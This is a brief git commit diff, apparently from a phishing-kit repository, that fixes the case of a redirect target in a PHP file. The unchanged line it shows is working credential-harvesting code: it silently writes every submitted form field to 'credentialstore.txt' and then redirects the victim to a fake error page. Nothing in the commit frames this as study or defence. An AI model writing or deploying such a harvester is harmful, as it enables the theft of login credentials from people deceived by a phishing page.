7b893511896c1b195decdde0f85ac0a44a213b72
4chtung <4chtung@friedsec.net>
2018-03-20 18:17:57 +0000

    Lousy Case Sensitivity!

--- site/post.php
+++ site/post.php
@@ -1,2 +1,2 @@
 <?php $file = 'credentialstore.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>
-<meta http-equiv="refresh" content="0; url=./Error.html" />
+<meta http-equiv="refresh" content="0; url=./error.html" />
